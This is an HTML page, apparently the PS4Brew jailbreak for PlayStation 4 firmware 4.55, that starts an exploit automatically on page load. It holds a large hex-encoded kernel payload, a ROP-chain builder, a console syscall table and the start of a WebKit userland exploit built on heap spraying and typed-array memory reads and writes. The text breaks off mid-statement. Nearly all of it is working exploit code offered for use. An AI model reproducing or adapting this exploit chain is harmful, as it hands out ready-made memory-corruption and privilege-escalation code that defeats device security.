<!DOCTYPE html><title>PS4Brew 4.55</title><meta content="width=device-width,initial-scale=1"name=viewport><style>.loader{position:absolute;left:50%;top:50%;margin:-75px 0 0 -75px;border:10px solid #f3f3f3;border-radius:50%;border-top:10px solid #044595;border-left:10px solid #044595;width:120px;height:120px;-webkit-animation:spin 1s linear infinite}.info{overflow:hidden;position:fixed;position:absolute;top:50%;left:50%;font-size:45px;font-family:sans-serif;transform:translate(-50%,-50%)}.credits{overflow:hidden;position:fixed;position:absolute;top:90%;left:50%;font-size:16px;font-family:sans-serif;text-align:center;transform:translate(-50%,-90%)}@-webkit-keyframes spin{0%{-webkit-transform:rotate(0)}100%{-webkit-transform:rotate(360deg)}}</style><body onload=runExploit() style=margin:0><div class=loader id=loader></div><div class=info id=allset style=display:none>You're all set!</div><div class=info id=fail style=display:none>Something went wrong :(</div><div class=info id=badfw style=display:none>Only firmware 4.55 is supported!</div><div class=credits id=footer><ul style=list-style:none;padding-left:0><li><a href=#>qwertyoruiopz</a><li><a href=#>flatz</a><li><a href=#>specter</a><li>anonymous contributors</ul></div><script>function runExploit(){setTimeout(exploit,1500)}function allset(){document.getElementById("loader").style.display="none",document.getElementById("allset").style.display="block"}function fail(e){document.getElementById("loader").style.display="none",document.getElementById("fail").style.display="block",alert(e)}/* payload.js */var payload=[0x00008BE9,0x0F2E6600,0x0000841F,0x90000000,0x08478B48,0x000082B9,0x708B48C0,0x408B4C40,0x48320F48,0x8B48D189,0x00011896,0xE1C14800,0xC1094820,0x0446C748,0x00000000,0x001446C7,0xC7000000,0x00000002,0x918B4800,0x00D303E0,0x30568948,0xFFC2C748,0x48FFFFFF,0x6460818B,0x894901EA,0x89492040,0x8B481840,0x00013087,0x13BF4800,0x00000000,0x48380100,0x48605089,0x48587889,0x31685089,0x0F66C3C0,0x0000441F,0xBB495741,0x00001260,0x00000000,0xED3D8D4C,0x41FFFFFF,0xDF014D54,0xC9B84855,0xFFFFFFF5,0x53FFFFFF,0x18EC8348,0xFFF8014C,0x13B848D0,0xFFFFFFF0,0x48FFFFFF,0xFFFFF8BD,0xFFFFFFFF,0xF8014CFF,0xB848D0FF,0xFFFFED20,0xFFFFFFFF,0x8D49F631,0xB848073C,0xFFFFF5BD,0xFFFFFFFF,0xFFF8014C,0xE0B848D0,0xFFFFFFEF,0x4CFFFFFF,0xD0FFF801,0xF9A0B848,0xFFFFFFFF,0xD231FFFF,0x073C8D49,0xEEFAB848,0xFFFFFFFF,0xF631FFFF,0xFFF8014C,0x89C085D0,0x448B4AC3,0x8E0F003D,0x00000084,0xF9C2BA48,0xFFFFFFFF,0x8D49FFFF,0xDEBF1734,0xFF000000,0xB1B84810,0xFFFFFFF5,0x48FFFFFF,0x0624548D,0x2444C748,0x00000006,0x8F07BE00,0xDF89C01C,0x2444C766,0xC600000E,0x010B2444,0xFFF8014C,0x41DF89D0,0xB848C489,0xFFFFEF06,0xFFFFFFFF,0xFFF8014C,0x448B4AD0,0xBA48003D,0xFFFFF9D8,0xFFFFFFFF,0x17348D49,0x0000DEBF,0x4810FF00,0x4418C483,0x5D5BE089,0x5F415C41,0x001F0FC3,0xF9ADBA48,0xFFFFFFFF,0xDEBFFFFF,0x49000000,0xFF17348D,0xFF77E910,0xC748FFFF,0x000003C0,0x0A81E900,0xC7480000,0x000004C0,0x0A75E900,0xC7480000,0x000005C0,0x0A69E900,0xC7480000,0x000006C0,0x0A5DE900,0xC7480000,0x00000AC0,0x0A51E900,0xC7480000,0x00003AC0,0x0A45E900,0xC7480000,0x000015C0,0x0A39E900,0xC7480000,0x00017AC0,0x0A2DE900,0xC7480000,0x000016C0,0x0A21E900,0xC7480000,0x00007BC0,0x0A15E900,0xC7480000,0x00007CC0,0x0A09E900,0xC7480000,0x000080C0,0x09FDE900,0xC7480000,0x000088C0,0x09F1E900,0xC7480000,0x000089C0,0x09E5E900,0xC7480000,0x0000BCC0,0x09D9E900,0xC7480000,0x0000BDC0,0x09CDE900,0xC7480000,0x000110C0,0x09C1E900,0xC7480000,0x0001DEC0,0x09B5E900,0xC7480000,0x0001EDC0,0x09A9E900,0x89480000,0xEC8348FA,0xF1894808,0x00025ABF,0x31F63100,0x098EE8C0,0xC35A0000,0x08EC8348,0xF631D231,0x113D8D48,0x4500000A,0x3145C931,0xFFC931C0,0x0012AB15,0x158D4800,0x00001014,0x1B358D48,0x8900000A,0xF4E958C7,0x53000004,0x45C93145,0xC931C031,0xF631D231,0x283D8D48,0xFF00000A,0x00127B15,0x158D4800,0x00001024,0x2C358D48,0x8900000A,0xE8C789C3,0x000004C3,0x8D48DF89,0x0011A315,0x358D4800,0x00000A1A,0x0004AEE8,0x48DF8900,0x101E158D,0x8D480000,0x000A0A35,0x0499E800,0xDF890000,0x79158D48,0x48000010,0x09FC358D,0x84E80000,0x89000004,0x158D48DF,0x00001104,0xEF358D48,0xE8000009,0x0000046F,0x8D48DF89,0x0010AF15,0x358D4800,0x000009E3,0x00045AE8,0x48DF8900,0x0F8A158D,0x8D480000,0x0009D535,0x0445E800,0xDF890000,0x35158D48,0x48000010,0x09C7358D,0x30E80000,0x89000004,0x158D48DF,0x00000F40,0xB9358D48,0xE8000009,0x0000041B,0x8D48DF89,0x000FF315,0x358D4800,0x000009AB,0x000406E8,0x48DF8900,0x0F9E158D,0x8D480000,0x00099E35,0x03F1E800,0xDF890000,0xF1158D48,0x4800000F,0x0990358D,0xDCE80000,0x89000003,0x158D48DF,0x0000109C,0x83358D48,0xE8000009,0x000003C7,0x8D48DF89,0x00103715,0x358D4800,0x00000975,0x0003B2E8,0x48DF8900,0x0F82158D,0x8D480000,0x00096735,0x039DE800,0xDF890000,0x25158D48,0x48000010,0x095A358D,0x88E80000,0x89000003,0x158D48DF,0x00000EB0,0x4D358D48,0xE8000009,0x00000373,0x8D48DF89,0x000F6B15,0x358D4800,0x00000941,0x00035EE8,0x48DF8900,0x1026158D,0x8D480000,0x00093335,0x0349E800,0xDF890000,0xB1158D48,0x4800000E,0x0925358D,0x34E80000,0x89000003,0x158D48DF,0x00000EE4,0x18358D48,0xE8000009,0x0000031F,0x8D48DF89,0x000F3715,0x358D4800,0x0000090A,0x00030AE8,0x48DF8900,0x0F2A158D,0x8D480000,0x0008FD35,0x02F5E800,0xDF890000,0x6D158D48,0x4800000E,0x08E7358D,0xE0E80000,0x89000002,0x158D48DF,0x00000F80,0xD9358D48,0xE8000008,0x000002CB,0x8D48DF89,0x000F7B15,0x358D4800,0x000008CC,0x0002B6E8,0x48DF8900,0x0E7E158D,0x8D480000,0x0008BC35,0x02A1E800,0xDF890000,0xC1158D48,0x4800000D,0x08AF358D,0x8CE80000,0x89000002,0x158D48DF,0x00000E0C,0xA3358D48,0xE8000008,0x00000277,0x8D48DF89,0x000E8715,0x358D4800,0x00000899,0x000262E8,0x48DF8900,0x0E4A158D,0x8D480000,0x00088B35,0x024DE800,0xDF890000,0x9D158D48,0x4800000E,0x087C358D,0x38E80000,0x89000002,0x158D48DF,0x00000DF0,0x68358D48,0xE8000008,0x00000223,0x8D48DF89,0x000D3B15,0x358D4800,0x00000858,0x00020EE8,0x48DF8900,0x0E3E158D,0x8D480000,0x00084B35,0x01F9E800,0xDF890000,0x89158D48,0x4800000D,0x0830358D,0xE4E80000,0x89000001,0x158D48DF,0x00000E74,0x23358D48,0xE8000008,0x000001CF,0x8D48DF89,0x000E2F15,0x358D4800,0x00000807,0x0001BAE8,0x48DF8900,0x0E72158D,0x8D480000,0x00080135,0x01A5E800,0xDF890000,0x1D158D48,0x4800000E,0x07F3358D,0x90E80000,0x89000001,0x158D48DF,0x00000DC8,0xE7358D48,0xE8000007,0x0000017B,0x8D48DF89,0x000E1315,0x358D4800,0x000007DC,0x000166E8,0x48DF8900,0x0D0E158D,0x8D480000,0x0007D335,0x0151E800,0xDF890000,0xB9158D48,0x4800000D,0x07C5358D,0x3CE80000,0x89000001,0x158D48DF,0x00000C9C,0xB8358D48,0xE8000007,0x00000127,0x8D48DF89,0x000C7715,0x358D4800,0x000007AB,0x000112E8,0x48DF8900,0x0DEA158D,0x8D480000,0x0007A035,0x00FDE800,0xDF890000,0x35158D48,0x4800000C,0x0793358D,0xE8E80000,0x89000000,0x158D48DF,0x00000C28,0x86358D48,0xE8000007,0x000000D3,0x8D48DF89,0x000DA315,0x358D4800,0x0000077B,0x0000BEE8,0x48DF8900,0x0C7E158D,0x8D480000,0x00076F35,0x00A9E800,0xDF890000,0x01158D48,0x4800000C,0x0760358D,0x94E80000,0x89000000,0x158D48DF,0x00000CBC,0x57358D48,0xE8000007,0x0000007F,0x8D48DF89,0x000C8715,0x358D4800,0x00000748,0x00006AE8,0x48DF8900,0x0D12158D,0x8D480000,0x00073935,0x0055E800,0xDF890000,0xF5158D48,0x4800000B,0x072B358D,0x40E80000,0x89000000,0x158D48DF,0x00000C88,0x1C358D48,0xE8000007,0x0000002B,0x8D48DF89,0x000C8315,0x358D4800,0x0000070D,0x000016E8,0x5BDF8900,0x9D158D48,0x4800000B,0x06FE358D,0x00E90000,0x48000000,0x024FC0C7,0x5CE90000,0x48000004,0x0250C0C7,0x50E90000,0x48000004,0x4808EC83,0x016006C7,0x89480000,0x89C031F2,0x0251BFFE,0x31E80000,0x5A000004,0xEC8348C3,0xF1894808,0x8948D231,0xC03145FE,0x000252BF,0xE8C03100,0x00000414,0x8348C35A,0xFE8908EC,0xC931D231,0x000253BF,0xE8C03100,0x000003FC,0x8348C35A,0xD23108EC,0x8D48F631,0x0006873D,0xC9314500,0x31C03145,0x1915FFC9,0x4800000D,0x0C62158D,0x8D480000,0x00068035,0x58C78900,0xFFFF62E9,0xC0C748FF,0x00000025,0x0003BEE9,0xC0C74800,0x00000036,0x0003B2E9,0xC0C74800,0x0000000B,0x0003A6E9,0xEC834800,0x358D4808,0x00000C3C,0x593D8D48,0x48000006,0x0CA205C7,0x00000000,0x52E80000,0x85FFFFFF,0x482A74C0,0x0C1A358D,0x8D480000,0x0006463D,0xFF3BE800,0xC085FFFF,0x8D481374,0x000C0335,0x3D8D4800,0x00000642,0xFFFF24E8,0xF13D8BFF,0x4800000B,0x0BF2158D,0x8D480000,0x00063C35,0xFED5E800,0x3D8BFFFF,0x00000BD8,0x11158D48,0x4800000C,0x0635358D,0xBCE80000,0x8BFFFFFE,0x000BBF3D,0x158D4800,0x00000C30,0x2D358D48,0xE8000006,0xFFFFFEA3,0x0BA63D8B,0x8D480000,0x000BF715,0x358D4800,0x0000061C,0xFFFE8AE8,0x8D3D8BFF,0x4800000B,0x0C1E158D,0x8D480000,0x00061235,0xFE71E800,0x3D8BFFFF,0x00000B74,0x2D158D48,0x4800000C,0x0612358D,0x58E80000,0x8BFFFFFE,0x000B5B3D,0x158D4800,0x00000B9C,0x17358D48,0xE8000006,0xFFFFFE3F,0x0B423D8B,0x8D480000,0x000BCB15,0x358D4800,0x00000617,0xFFFE26E8,0x293D8BFF,0x4800000B,0x0C0A158D,0x8D480000,0x00060C35,0xFE0DE800,0x3D8BFFFF,0x00000B10,0x71158D48,0x4800000B,0x0601358D,0xF4E80000,0x8BFFFFFD,0x000AF73D,0x158D4800,0x00000B78,0xF6358D48,0xE8000005,0xFFFFFDDB,0x0ADE3D8B,0x8D480000,0x000B7715,0x358D4800,0x000005EC,0xFFFDC2E8,0xC53D8BFF,0x4800000A,0x0ADE158D,0x8D480000,0x0005E235,0xFDA9E800,0x3D8BFFFF,0x00000AAC,0x6D158D48,0x4800000B,0x05D8358D,0x90E80000,0x8BFFFFFD,0x000A933D,0x158D4800,0x00000A7C,0xCF358D48,0xE8000005,0xFFFFFD77,0x0A7A3D8B,0x8D480000,0x000B2315,0x358D4800,0x000005CC,0xFFFD5EE8,0x613D8BFF,0x4800000A,0x0A82158D,0x8D480000,0x0005CB35,0xFD45E800,0x3D8BFFFF,0x00000A48,0xA1158D48,0x4800000A,0x05C9358D,0x2CE80000,0x8BFFFFFD,0x000A2F3D,0x158D4800,0x00000B28,0xB7358D48,0xE8000005,0xFFFFFD13,0x0A163D8B,0x8D480000,0x000A5F15,0x358D4800,0x000005AB,0xFFFCFAE8,0xFD3D8BFF,0x48000009,0x0A06158D,0x8D480000,0x00059A35,0xFCE1E800,0x3D8BFFFF,0x000009E4,0xB5158D48,0x4800000A,0x0588358D,0xC8E80000,0x8BFFFFFC,0x0009CB3D,0x158D4800,0x00000A6C,0x7C358D48,0xE8000005,0xFFFFFCAF,0x09B23D8B,0x8D480000,0x000A8B15,0x358D4800,0x0000057A,0xFFFC96E8,0x993D8BFF,0x48000009,0x09C2158D,0x8D480000,0x00057735,0xFC7DE800,0x3D8BFFFF,0x00000980,0x49158D48,0x4800000A,0x0574358D,0x64E80000,0x8BFFFFFC,0x0009673D,0x158D4800,0x00000A58,0x71358D48,0xE8000005,0xFFFFFC4B,0x094E3D8B,0x8D480000,0x00097F15,0x358D4800,0x0000056E,0xFFFC32E8,0x353D8BFF,0x48000009,0x0926158D,0x8D480000,0x00055C35,0xFC19E800,0x3D8BFFFF,0x0000091C,0x2D158D48,0x48000009,0x054A358D,0x00E80000,0x8BFFFFFC,0x0009033D,0x158D4800,0x000009EC,0x38358D48,0xE8000005,0xFFFFFBE7,0x08EA3D8B,0x8D480000,0x00096315,0x358D4800,0x00000526,0xFFFBCEE8,0xD13D8BFF,0x48000008,0x0982158D,0x8D480000,0x00051435,0xFBB5E800,0x3D8BFFFF,0x000008B8,0x21158D48,0x58000009,0x03358D48,0xE9000005,0xFFFFFB9B,0x49C03148,0x050FCA89,0x48C30172,0x09093D83,0x74000000,0x15FF5018,0x00000900,0x48088959,0xFFFFC0C7,0xC748FFFF,0xFFFFFFC2,0x0000C3FF,0x00000000,0x7665642F,0x6363692F,0x6E61665F,0x63636900,0x6E61665F,0x6E616320,0x6F207427,0x0A6E6570,0x6369000A,0x61665F63,0x706F206E,0x64656E65,0x00000A0A,0x00000000,0x706D6574,0x74617265,0x20657275,0x65726874,0x6C6F6873,0x65732064,0x6F742074,0x64203120,0x65726765,0x000A0A65,0x7379732F,0x2F6D6574,0x6D6D6F63,0x6C2F6E6F,0x6C2F6269,0x63536269,0x73795365,0x6C697455,0x7270732E,0x63730078,0x73795365,0x6C697455,0x646E6553,0x74737953,0x6F4E6D65,0x69666974,0x69746163,0x69576E6F,0x65546874,0x6C007478,0x63536269,0x62694C65,0x746E4963,0x616E7265,0x70732E6C,0x6D007872,0x6F6C6C61,0x72660063,0x63006565,0x6F6C6C61,0x65720063,0x6F6C6C61,0x656D0063,0x696C616D,0x6D006E67,0x65736D65,0x656D0074,0x7970636D,0x6D656D00,0x00706D63,0x63727473,0x73007970,0x636E7274,0x73007970,0x61637274,0x74730074,0x61636E72,0x74730074,0x6E656C72,0x72747300,0x00706D63,0x6E727473,0x00706D63,0x69727073,0x0066746E,0x72706E73,0x66746E69,0x63737300,0x00666E61,0x63727473,0x73007268,0x63727274,0x73007268,0x74737274,0x74730072,0x70756472,0x6E697200,0x00786564,0x69647369,0x00746967,0x696F7461,0x72747300,0x7970636C,0x72747300,0x6F727265,0x475F0072,0x63707465,0x65707974,0x74535F00,0x006C756F,0x706F6362,0x72730079,0x00646E61,0x74637361,0x00656D69,0x74637361,0x5F656D69,0x6D670072,0x656D6974,0x746D6700,0x5F656D69,0x6F6C0073,0x746C6163,0x00656D69,0x61636F6C,0x6D69746C,0x00725F65,0x69746B6D,0x6F00656D,0x646E6570,0x72007269,0x64646165,0x72007269,0x64646165,0x725F7269,0x6C657400,0x7269646C,0x65657300,0x7269646B,0x77657200,0x64646E69,0x63007269,0x65736F6C,0x00726964,0x66726964,0x65670064,0x6F727074,0x6D616E67,0x6F660065,0x006E6570,0x61657266,0x77660064,0x65746972,0x65736600,0x66006B65,0x6C6C6574,0x6C636600,0x0065736F,0x69727066,0x0066746E,0x5362696C,0x79536563,0x646F6D73,0x2E656C75,0x78727073,0x65637300,0x6D737953,0x6C75646F,0x616F4C65,0x646F4D64,0x00656C75,0x6B62696C,0x656E7265,0x70732E6C,0x6C007872,0x656B6269,0x6C656E72,0x6265775F,0x7270732E,0x696C0078,0x72656B62,0x5F6C656E,0x2E737973,0x78727073,0x735F5F00,0x6B636174,0x6B68635F,0x6175675F,0x5F006472,0x6174735F,0x635F6B63,0x665F6B68,0x006C6961,0x72655F5F,0x00726F72,0x4B656373,0x656E7265,0x7272456C,0x7300726F,0x654B6563,0x6C656E72,0x64616F4C,0x72617453,0x646F4D74,0x00656C75,0x4B656373,0x656E7265,0x6C6C416C,0x7461636F,0x72694465,0x4D746365,0x726F6D65,0x63730079,0x72654B65,0x4D6C656E,0x69447061,0x74636572,0x6F6D654D,0x73007972,0x654B6563,0x6C656E72,0x74617453,0x65637300,0x6E72654B,0x704F6C65,0x73006E65,0x654B6563,0x6C656E72,0x64616552,0x65637300,0x6E72654B,0x734C6C65,0x006B6565,0x4B656373,0x656E7265,0x6F6C436C,0x73006573,0x654B6563,0x6C656E72,0x65656C53,0x63730070,0x72654B65,0x556C656E,0x65656C73,0x63730070,0x72654B65,0x476C656E,0x69747465,0x666F656D,0x00796164,0x4B656373,0x656E7265,0x7465476C,0x636F7250,0x54737365,0x00656D69,0x4B656373,0x656E7265,0x7465476C,0x72727543,0x43746E65,0x73007570,0x74637379,0x7973006C,0x6C746373,0x616E7962,0x7300656D,0x72617379,0x65006863,0x76636578,0x74700065,0x61657268,0x65735F64,0x7000666C,0x65726874,0x735F6461,0x66617465,0x696E6966,0x6E5F7974,0x63730070,0x72654B65,0x436C656E,0x74616572,0x75714565,0x00657565,0x4B656373,0x656E7265,0x6C65446C,0x45657465,0x75657571,0x63730065,0x72654B65,0x416C656E,0x73556464,0x76457265,0x00746E65,0x4B656373,0x656E7265,0x6464416C,0x64616552,0x6E657645,0x65670074,0x64697574,0x74656700,0x00646967,0x70746567,0x73006469,0x69757465,0x65730064,0x64696774,0x74657300,0x69756572,0x65730064,0x67657274,0x2F006469,0x3662696C,0x646C2F34,0x6E696C2D,0x782D7875,0x362D3638,0x6F732E34,0x0000322E,0x00000000,0x00000000,0x00000000,0x00000000,0x00000000,0x00000000,0x00000000,0x00000000,0x00000001,0x00000001,0x00000001,0x00000000,0x00000000,0x00000000,0x00000000,0x00000000,0x262012E8,0x00000009,0x00000008,0x00000000,0x26201308,0x00000009,0x6FFFFEF5,0x00000000,0x262011A0,0x00000009,0x00000005,0x00000000,0x26201198,0x00000009,0x00000006,0x00000000,0x26201180,0x00000009,0x0000000A,0x00000000,0x00000001,0x00000000,0x0000000B,0x00000000,0x00000018,0x00000000,0x00000015,0x00000000,0x00000000,0x00000000,0x00000007,0x00000000,0x262011C0,0x00000009,0x00000008,0x00000000,0x00000018,0x00000000,0x00000009,0x00000000,0x00000018,0x00000000,0x0000001E,0x00000000,0x00000008,0x00000000,0x6FFFFFFB,0x00000000,0x08000001,0x00000000,0x6FFFFFF9,0x00000000,0x00000001,0x00000000,0x00000000,0x00000000,0x00000000,0x00000000,0x00000000,0x00000000,0x00000000,0x00000000,0x00000000,0x00000000,0x00000000,0x00000000,0x00000000,0x00000000,0x00000000,0x00000000,0x00000000,0x00000000,0x00000000,0x00000000,0x26201308,0x00000009,0x262011D8,0x00000009,0x00000000,0x00000000,0x00000000,0x00000000,0];/* rop.js */function malloc(t){var i=new Uint8Array(65536+t);window.nogc.push(i);var s=p.read8(p.leakval(i).add32(16));return s.backing=i,s}function mallocu32(t){var i=new Uint8Array(65536+4*t);window.nogc.push(i);var s=p.read8(p.leakval(i).add32(16));return s.backing=new Uint32Array(i.buffer),s}function stringify(t){for(var i=new Uint8Array(t.length+1),s=0;s<t.length;s++)i[s]=255&t.charCodeAt(s);return window.nogc.push(i),p.read8(p.leakval(i).add32(16))}var krop=function(t,i){return this.stackBase=i,this.stackPointer=0,this.push=function(i){t.write8(this.stackBase.add32(this.stackPointer),i),this.stackPointer+=8},this.write64=function(t,i){this.push(window.gadgets["pop rdi"]),this.push(t),this.push(window.gadgets["pop rax"]),this.push(i),this.push(window.gadgets["mov [rdi], rax"])},this};window.rop=function(){return this.stack=new Uint32Array(65536),this.stackBase=p.read8(p.leakval(this.stack).add32(16)),this.count=0,this.clear=function(){this.count=0,this.runtime=void 0;for(var t=0;t<2040;t++)p.write8(this.stackBase.add32(8*t),0)},this.pushSymbolic=function(){return this.count++,this.count-1},this.finalizeSymbolic=function(t,i){p.write8(this.stackBase.add32(8*t),i)},this.push=function(t){this.finalizeSymbolic(this.pushSymbolic(),t)},this.push_write8=function(t,i){this.push(gadgets["pop rdi"]),this.push(t),this.push(gadgets["pop rsi"]),this.push(i),this.push(gadgets["mov [rdi], rsi"])},this.fcall=function(t,i,s,h,n,a,r){return void 0!=i&&(this.push(gadgets["pop rdi"]),this.push(i)),void 0!=s&&(this.push(gadgets["pop rsi"]),this.push(s)),void 0!=h&&(this.push(gadgets["pop rdx"]),this.push(h)),void 0!=n&&(this.push(gadgets["pop rcx"]),this.push(n)),void 0!=a&&(this.push(gadgets["pop r8"]),this.push(a)),void 0!=r&&(this.push(gadgets["pop r9"]),this.push(r)),this.push(t),this},this.run=function(){var t=p.loadchain(this,this.notimes);return this.clear(),t},this};/* syscalls.js */function swapkeyval(s){var _={};for(var e in s)s.hasOwnProperty(e)&&(_[s[e]]=e);return _}window.nameforsyscall=swapkeyval(window.syscallnames),window.syscalls={},window.syscallnames={sys_exit:1,sys_fork:2,sys_read:3,sys_write:4,sys_open:5,sys_close:6,sys_wait4:7,sys_unlink:10,sys_chdir:12,sys_chmod:15,sys_getpid:20,sys_setuid:23,sys_getuid:24,sys_geteuid:25,sys_recvmsg:27,sys_sendmsg:28,sys_recvfrom:29,sys_accept:30,sys_getpeername:31,sys_getsockname:32,sys_access:33,sys_chflags:34,sys_fchflags:35,sys_sync:36,sys_kill:37,sys_stat:38,sys_getppid:39,sys_dup:41,sys_pipe:42,sys_getegid:43,sys_profil:44,sys_getgid:47,sys_getlogin:49,sys_setlogin:50,sys_sigaltstack:53,sys_ioctl:54,sys_reboot:55,sys_revoke:56,sys_execve:59,sys_msync:65,sys_munmap:73,sys_mprotect:74,sys_madvise:75,sys_mincore:78,sys_getgroups:79,sys_setgroups:80,sys_setitimer:83,sys_getitimer:86,sys_getdtablesize:89,sys_dup2:90,sys_fcntl:92,sys_select:93,sys_fsync:95,sys_setpriority:96,sys_socket:97,sys_connect:98,sys_getpriority:100,sys_send:101,sys_recv:102,sys_bind:104,sys_setsockopt:105,sys_listen:106,sys_recvmsg:113,sys_sendmsg:114,sys_gettimeofday:116,sys_getrusage:117,sys_getsockopt:118,sys_readv:120,sys_writev:121,sys_settimeofday:122,sys_fchmod:124,sys_recvfrom:125,sys_setreuid:126,sys_setregid:127,sys_rename:128,sys_flock:131,sys_sendto:133,sys_shutdown:134,sys_socketpair:135,sys_mkdir:136,sys_rmdir:137,sys_utimes:138,sys_adjtime:140,sys_getpeername:141,sys_setsid:147,sys_sysarch:165,sys_setegid:182,sys_seteuid:183,sys_fstat:189,sys_lstat:190,sys_pathconf:191,sys_fpathconf:192,sys_getrlimit:194,sys_setrlimit:195,sys_getdirentries:196,sys___sysctl:202,sys_mlock:203,sys_munlock:204,sys_futimes:206,sys_poll:209,sys_clock_gettime:232,sys_clock_settime:233,sys_clock_getres:234,sys_ktimer_create:235,sys_ktimer_delete:236,sys_ktimer_settime:237,sys_ktimer_gettime:238,sys_ktimer_getoverrun:239,sys_nanosleep:240,sys_rfork:251,sys_issetugid:253,sys_getdents:272,sys_preadv:289,sys_pwritev:290,sys_getsid:310,sys_aio_suspend:315,sys_mlockall:324,sys_munlockall:325,sys_sched_setparam:327,sys_sched_getparam:328,sys_sched_setscheduler:329,sys_sched_getscheduler:330,sys_sched_yield:331,sys_sched_get_priority_max:332,sys_sched_get_priority_min:333,sys_sched_rr_get_interval:334,sys_utrace:335,sys_sigprocmask:340,sys_sigprocmask:340,sys_sigsuspend:341,sys_sigpending:343,sys_sigtimedwait:345,sys_sigwaitinfo:346,sys_kqueue:362,sys_kevent:363,sys_uuidgen:392,sys_sendfile:393,sys_fstatfs:397,sys_ksem_close:400,sys_ksem_post:401,sys_ksem_wait:402,sys_ksem_trywait:403,sys_ksem_init:404,sys_ksem_open:405,sys_ksem_unlink:406,sys_ksem_getvalue:407,sys_ksem_destroy:408,sys_sigaction:416,sys_sigreturn:417,sys_getcontext:421,sys_setcontext:422,sys_swapcontext:423,sys_sigwait:429,sys_thr_create:430,sys_thr_exit:431,sys_thr_self:432,sys_thr_kill:433,sys_ksem_timedwait:441,sys_thr_suspend:442,sys_thr_wake:443,sys_kldunloadf:444,sys__umtx_op:454,sys__umtx_op:454,sys_thr_new:455,sys_sigqueue:456,sys_thr_set_name:464,sys_rtprio_thread:466,sys_pread:475,sys_pwrite:476,sys_mmap:477,sys_lseek:478,sys_truncate:479,sys_ftruncate:480,sys_thr_kill2:481,sys_shm_open:482,sys_shm_unlink:483,sys_cpuset_getid:486,sys_cpuset_getaffinity:487,sys_cpuset_setaffinity:488,sys_openat:499,sys_pselect:522,sys_regmgr_call:532,sys_jitshm_create:533,sys_jitshm_alias:534,sys_dl_get_list:535,sys_dl_get_info:536,sys_dl_notify_event:537,sys_evf_create:538,sys_evf_delete:539,sys_evf_open:540,sys_evf_close:541,sys_evf_wait:542,sys_evf_trywait:543,sys_evf_set:544,sys_evf_clear:545,sys_evf_cancel:546,sys_query_memory_protection:47,sys_batch_map:548,sys_osem_create:549,sys_osem_delete:550,sys_osem_open:551,sys_osem_close:552,sys_osem_wait:553,sys_osem_trywait:554,sys_osem_post:555,sys_osem_cancel:556,sys_namedobj_create:557,sys_namedobj_delete:558,sys_set_vm_container:559,sys_debug_init:560,sys_suspend_process:561,sys_resume_process:562,sys_opmc_enable:563,sys_opmc_disable:564,sys_opmc_set_ctl:565,sys_opmc_set_ctr:566,sys_opmc_get_ctr:567,sys_budget_create:568,sys_budget_delete:569,sys_budget_get:570,sys_budget_set:571,sys_virtual_query:572,sys_mdbg_call:573,sys_sblock_create:574,sys_sblock_delete:575,sys_sblock_enter:576,sys_sblock_exit:577,sys_sblock_xenter:578,sys_sblock_xexit:579,sys_eport_create:580,sys_eport_delete:581,sys_eport_trigger:582,sys_eport_open:583,sys_eport_close:584,sys_is_in_sandbox:585,sys_dmem_container:586,sys_get_authinfo:587,sys_mname:588,sys_dynlib_dlopen:589,sys_dynlib_dlclose:590,sys_dynlib_dlsym:591,sys_dynlib_get_list:592,sys_dynlib_get_info:593,sys_dynlib_load_prx:594,sys_dynlib_unload_prx:595,sys_dynlib_do_copy_relocations:596,sys_dynlib_prepare_dlclose:597,sys_dynlib_get_proc_param:598,sys_dynlib_process_needed_and_relocate:599,sys_sandbox_path:600,sys_mdbg_service:601,sys_randomized_path:602,sys_rdup:603,sys_dl_get_metadata:604,sys_workaround8849:605,sys_is_development_mode:606,sys_get_self_auth_info:607,sys_dynlib_get_info_ex:608,sys_budget_get_ptype:610,sys_budget_getid:609,sys_get_paging_stats_of_all_threads:611,sys_get_proc_type_info:612,sys_get_resident_count:613,sys_prepare_to_suspend_process:614,sys_get_resident_fmem_count:615,sys_thr_get_name:616,sys_set_gpo:617,sys_thr_suspend_ucontext:632,sys_thr_resume_ucontext:633,sys_thr_get_ucontext:634};/* loader.js */var loader = [2670408,599568,2303197184,3234285822,240,264931657,12077061,153493504,4278190080,50128,1,0,0,0];/* userland.js */function makeid(){var text="";var possible="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";for(var i=0;i<8;i++) text+=possible.charAt(Math.floor(Math.random()*possible.length));return text};var instancespr=[];for(var i=0;i<4096;i++){instancespr[i]=new Uint32Array(1);instancespr[i][makeid()]=50057} var _dview;function u2d(low,hi){if(!_dview)_dview=new DataView(new ArrayBuffer(16));_dview.setUint32(0,hi);_dview.setUint32(4,low);return _dview.getFloat64(0)} var dgc=function(){for(var i=0;i<0x100;i++){new ArrayBuffer(0x100000)}}; function int64(low,hi){this.low=(low>>>0);this.hi=(hi>>>0);this.add32inplace=function(val){var new_lo=(((this.low>>>0)+val)&0xFFFFFFFF)>>>0;var new_hi=(this.hi>>>0);if(new_lo<this.low){new_hi++} this.hi=new_hi;this.low=new_lo}; this.add32=function(val){var new_lo=(((this.low>>>0)+val)&0xFFFFFFFF)>>>0;var new_hi=(this.hi>>>0);if(new_lo<this.low){new_hi++} return new int64(new_lo,new_hi)}; this.sub32=function(val){var new_lo=(((this.low>>>0)-val)&0xFFFFFFFF)>>>0;var new_hi=(this.hi>>>0);if(new_lo>(this.low)&0xFFFFFFFF){new_hi--} return new int64(new_lo,new_hi)}; this.sub32inplace=function(val){var new_lo=(((this.low>>>0)-val)&0xFFFFFFFF)>>>0;var new_hi=(this.hi>>>0);if(new_lo>(this.low)&0xFFFFFFFF){new_hi--} this.hi=new_hi;this.low=new_lo}; this.and32=function(val){var new_lo=this.low&val;var new_hi=this.hi;return new int64(new_lo,new_hi)}; this.and64=function(vallo,valhi){var new_lo=this.low&vallo;var new_hi=this.hi&valhi;return new int64(new_lo,new_hi)}; this.toString=function(val){val=16;var lo_str=(this.low>>>0).toString(val);var hi_str=(this.hi>>>0).toString(val);if(this.hi==0) return lo_str;else lo_str=zeroFill(lo_str,8); return hi_str+lo_str}; this.toPacked=function(){return{hi:this.hi,low:this.low}}; this.setPacked=function(pck){this.hi=pck.hi;this.low=pck.low;return this}; return this} function zeroFill(number,width){width-=number.toString().length;if(width>0){return new Array(width+(/\./.test(number)?2:1)).join('0')+number} return number+""} var nogc=[];var fail=function(){alert.apply(null,arguments);throw "fail"}; var tgt={a:0,b:0,c:0,d:0}; var y=new ImageData(1,0x4000); postMessage("","*",[y.data.buffer]);var props={};for(var 